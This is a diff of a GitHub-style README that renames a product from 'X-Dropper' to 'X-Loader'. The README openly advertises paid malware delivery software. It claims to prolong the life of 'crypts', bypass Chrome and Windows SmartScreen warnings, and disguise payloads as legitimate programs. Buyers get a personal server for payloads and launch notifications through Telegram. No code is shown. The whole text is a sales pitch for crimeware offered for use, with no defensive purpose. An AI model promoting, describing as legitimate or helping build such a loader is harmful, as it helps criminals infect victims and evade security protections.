@@ -1,4 +1,4 @@
-# 🌟 X-Dropper
+# 🌟 X-Loader
 
 Welcome to my repository! Here you will find many useful tools that will help you solve various tasks.
 
@@ -7,7 +7,7 @@ Welcome to my repository! Here you will find many useful tools that will help yo
 
 ## 🚀 Description
 
-Dropper is malware delivery software that helps your crypts live longer, bypass Chrome and Windows smart screen alerts, 
+Loader is malware delivery software that helps your crypts live longer, bypass Chrome and Windows smart screen alerts, 
 and also safely start one or more software programs that make you look like a legitimate program.
 
 <img src="https://i.ibb.co/ymWRpxmP/bandicam-2025-02-11-15-43-54-132.gif" alt="Description of image" width="600" height="350" />
@@ -20,11 +20,11 @@ and also safely start one or more software programs that make you look like a le
 
 After purchase, we provide:
 
-- 💻 Personal Server where you can upload files to be delivered to your clients with Dropper.
+- 💻 Personal Server where you can upload files to be delivered to your clients with Loader.
 
 <img src="https://i.ibb.co/xKYgNK8f/Screenshot-3.png" alt="Description of image" width="600" height="300" />
 
-- 📥 Our dropper sends launch notifications to your Telegram channel
+- 📥 Our Loader sends launch notifications to your Telegram channel
 
 <img src="https://i.ibb.co/TMrF6qkz/Screenshot-2.png" alt="Description of image" width="500" height="250" />
 
